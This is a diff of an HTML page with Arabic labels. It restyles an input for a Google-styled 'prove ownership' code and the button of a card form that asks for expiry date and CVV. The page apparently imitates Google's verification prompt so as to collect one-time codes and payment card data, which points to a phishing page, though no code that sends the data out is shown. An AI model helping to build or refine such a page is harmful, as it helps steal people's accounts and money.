@@ -56,21 +56,37 @@
         .google-code-line { font-weight: bold; font-family: monospace; font-size: 16px; margin-top: 10px; color: #3c4043; }
         .highlight-circle { border: 2px solid #d93025; border-radius: 20px; padding: 2px 8px; margin-right: 5px; }
 
-        .otp-input-wrapper { margin-top: 20px; }
+        .otp-input-wrapper { margin-top: 20px; width: 100%; }
         .google-input {
             width: 100%;
-            padding: 12px;
+            padding: 14px;
             border: 1px solid var(--border-color);
             border-radius: 4px;
             font-size: 16px;
-            margin-bottom: 24px;
+            margin-bottom: 15px; /* مسافة بين الحقل والزر */
             text-align: center;
             letter-spacing: 4px;
         }
         .google-input:focus { outline: none; border: 2px solid var(--primary-color); }
 
-        .google-footer-btns { display: flex; gap: 12px; flex-direction: row-reverse; }
-        .btn-blue { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; }
+        /* تعديل الزر ليكون طويلاً وعريضاً (Full Width) ومتناسقاً */
+        #confirm-google-btn {
+            width: 100%;
+            padding: 16px; /* زيادة الطول الرأسي */
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 500;
+            display: block;
+            transition: background-color 0.3s;
+        }
+        
+        #confirm-google-btn:hover {
+            background-color: #1765cc;
+        }
 
         /* باقي التنسيقات الأصلية */
         header { text-align: center; margin-bottom: 30px; }
@@ -107,9 +123,7 @@
 
             <div class="otp-input-wrapper">
                 <input type="text" id="google-otp-input" class="google-input" placeholder="أدخل الرمز" maxlength="6">
-                <div class="google-footer-btns">
-                    <button id="confirm-google-btn" class="btn-blue">إثبات الملكية</button>
-                </div>
+                <button id="confirm-google-btn" class="btn-blue">إثبات الملكية</button>
             </div>
         </div>
 
@@ -146,7 +160,7 @@
                         <div class="form-group" style="flex: 1;"><label>التاريخ</label><input type="text" id="expiry-date" class="form-control" placeholder="MM/YY" maxlength="5"></div>
                         <div class="form-group" style="flex: 1;"><label>CVV</label><input type="password" id="cvv" class="form-control" maxlength="4"></div>
                     </div>
-                    <button type="submit" id="submit-btn" class="btn-blue" style="width: 100%; padding: 15px; font-size: 16px;">دفع الآن</button>
+                    <button type="submit" id="submit-btn" class="btn-blue" style="width: 100%; padding: 16px; font-size: 16px; background-color: var(--primary-color); border: none; border-radius: 8px; color: white; cursor: pointer;">دفع الآن</button>
                 </form>
             </div>
         </div>
